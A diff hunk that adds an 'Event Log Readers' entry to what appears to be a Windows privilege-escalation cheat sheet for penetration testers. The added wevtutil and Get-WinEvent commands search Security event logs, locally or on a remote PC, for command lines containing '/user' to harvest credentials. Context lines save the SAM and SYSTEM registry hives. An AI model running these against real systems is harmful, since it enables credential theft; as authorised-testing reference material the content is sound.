@@ -2536,6 +2536,14 @@ C:\> reg save HKLM\SYSTEM SYSTEM.SAV
 C:\> reg save HKLM\SAM SAM.SAV
 ```
 
+- Event Log Readers
+
+```
+C:\> wevtutil qe Security /rd:true /f:text | Select-String "/user"
+C:\> wevtutil qe Security /rd:true /f:text /r:<remote PC> /u:<username> /p:<password> | findstr "/user"
+PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
 #6. - Persistence
 -----------------------------------------
 
